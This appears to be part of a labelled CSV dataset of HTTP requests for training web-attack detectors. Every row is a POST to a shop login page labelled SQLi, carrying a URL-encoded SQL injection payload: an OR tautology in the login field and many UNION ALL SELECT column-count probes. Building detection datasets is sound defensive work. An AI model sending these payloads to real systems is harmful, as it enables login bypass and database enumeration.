,id,method,path,query,label
3446,13446,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22OlVc%22%3D%22OlVc,SQLi
3447,13447,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22MsLG%22%3D%22MsLG,SQLi
3448,13448,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22zIpk%22%3D%22zIpk,SQLi
3449,13449,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22LWYy%22%3D%22LWYy,SQLi
3450,13450,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22eDrh%22%3D%22eDrh,SQLi
3451,13451,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22xZGN%22%3D%22xZGN,SQLi
3452,13452,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%28%28%22fRga%22%3D%22fRga,SQLi
3453,13453,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%28%28%22jLVv%22%3D%22jLVv,SQLi
3454,13454,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22kOpQ%22%3D%22kOpQ,SQLi
3455,13455,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22tNyy%22%3D%22tNyy,SQLi
3456,13456,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22SHsb%22%3D%22SHsb,SQLi
3457,13457,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22hTIo%22%3D%22hTIo,SQLi
3458,13458,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22YtKT%22%3D%22YtKT,SQLi
3459,13459,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22RvBI%22%3D%22RvBI,SQLi
3460,13460,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22fukY%22%3D%22fukY,SQLi
3461,13461,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22VXGu%22%3D%22VXGu,SQLi
3462,13462,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%28%28%28%22FbHv%22%3D%22FbHv,SQLi
3463,13463,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22MnKr%22%3D%22MnKr,SQLi
3464,13464,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22MSaK%22%3D%22MSaK,SQLi
3465,13465,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22BGfW%22%3D%22BGfW,SQLi
3466,13466,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22Ochj%22%3D%22Ochj,SQLi
3467,13467,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22GmRk%22%3D%22GmRk,SQLi
3468,13468,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22ZpnX%22%3D%22ZpnX,SQLi
3469,13469,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22AzCf%22%3D%22AzCf,SQLi
3470,13470,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22hqZq%22%3D%22hqZq,SQLi
3471,13471,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22ibTS%22%3D%22ibTS,SQLi
3472,13472,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%22VjyP%22%3D%22VjyP,SQLi
3473,13473,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%22FpUm%22%3D%22FpUm,SQLi
3474,13474,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22mihr%22%3D%22mihr,SQLi
3475,13475,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22mcbG%22%3D%22mcbG,SQLi
3476,13476,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22SMwC%22%3D%22SMwC,SQLi
3477,13477,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22TTZU%22%3D%22TTZU,SQLi
3478,13478,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22yoPZ%22%3D%22yoPZ,SQLi
3479,13479,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22Azic%22%3D%22Azic,SQLi
3480,13480,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22wEzu%22%3D%22wEzu,SQLi
3481,13481,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22vHqk%22%3D%22vHqk,SQLi
3482,13482,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%28%22fAse%22%20LIKE%20%22fAse,SQLi
3483,13483,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%28%22qTwm%22%20LIKE%20%22qTwm,SQLi
3484,13484,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22ETgn%22%20LIKE%20%22ETgn,SQLi
3485,13485,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22jifO%22%20LIKE%20%22jifO,SQLi
3486,13486,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22KztK%22%20LIKE%20%22KztK,SQLi
3487,13487,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22YzzV%22%20LIKE%20%22YzzV,SQLi
3488,13488,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22FlOf%22%20LIKE%20%22FlOf,SQLi
3489,13489,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22LIOp%22%20LIKE%20%22LIOp,SQLi
3490,13490,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22QQit%22%20LIKE%20%22QQit,SQLi
3491,13491,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%22tqrG%22%20LIKE%20%22tqrG,SQLi
3492,13492,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%28%28%22XbGq%22%20LIKE%20%22XbGq,SQLi
3493,13493,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%28%28%22oIsC%22%20LIKE%20%22oIsC,SQLi
3494,13494,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22cGNy%22%20LIKE%20%22cGNy,SQLi
3495,13495,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22yzBS%22%20LIKE%20%22yzBS,SQLi
3496,13496,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22hTJQ%22%20LIKE%20%22hTJQ,SQLi
3497,13497,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22xmCH%22%20LIKE%20%22xmCH,SQLi
3498,13498,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22WIOL%22%20LIKE%20%22WIOL,SQLi
3499,13499,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22Bghc%22%20LIKE%20%22Bghc,SQLi
3500,13500,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22uwTJ%22%20LIKE%20%22uwTJ,SQLi
3501,13501,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%22JyVY%22%20LIKE%20%22JyVY,SQLi
3502,13502,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%28%28%28%22SPQM%22%20LIKE%20%22SPQM,SQLi
3503,13503,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22OFwy%22%20LIKE%20%22OFwy,SQLi
3504,13504,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22JHVD%22%20LIKE%20%22JHVD,SQLi
3505,13505,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22OtGd%22%20LIKE%20%22OtGd,SQLi
3506,13506,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22GGuj%22%20LIKE%20%22GGuj,SQLi
3507,13507,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22ecYa%22%20LIKE%20%22ecYa,SQLi
3508,13508,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22MIpa%22%20LIKE%20%22MIpa,SQLi
3509,13509,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22PQLZ%22%20LIKE%20%22PQLZ,SQLi
3510,13510,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22NpON%22%20LIKE%20%22NpON,SQLi
3511,13511,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%28%28%28%22mstk%22%20LIKE%20%22mstk,SQLi
3512,13512,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL--%20%20AND%20%22nIrU%22%20LIKE%20%22nIrU,SQLi
3513,13513,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL--%20%20AND%20%22KbEk%22%20LIKE%20%22KbEk,SQLi
3514,13514,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22cEUo%22%20LIKE%20%22cEUo,SQLi
3515,13515,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22GShn%22%20LIKE%20%22GShn,SQLi
3516,13516,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22oOXl%22%20LIKE%20%22oOXl,SQLi
3517,13517,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22BmOC%22%20LIKE%20%22BmOC,SQLi
3518,13518,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22ByJs%22%20LIKE%20%22ByJs,SQLi
3519,13519,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22Wzcd%22%20LIKE%20%22Wzcd,SQLi
3520,13520,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22enfN%22%20LIKE%20%22enfN,SQLi
3521,13521,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL--%20%20AND%20%22Uhqk%22%20LIKE%20%22Uhqk,SQLi
3522,13522,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%204058--%20,SQLi
3523,13523,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%205632%2C%205632--%20,SQLi
3524,13524,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%207336%2C%207336%2C%207336--%20,SQLi
3525,13525,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%205108%2C%205108%2C%205108%2C%205108--%20,SQLi
3526,13526,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%206672%2C%206672%2C%206672%2C%206672%2C%206672--%20,SQLi
3527,13527,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%203530%2C%203530%2C%203530%2C%203530%2C%203530%2C%203530--%20,SQLi
3528,13528,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%203094%2C%203094%2C%203094%2C%203094%2C%203094%2C%203094%2C%203094--%20,SQLi
3529,13529,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20UNION%20ALL%20SELECT%208459%2C%208459%2C%208459%2C%208459%2C%208459%2C%208459%2C%208459%2C%208459--%20,SQLi
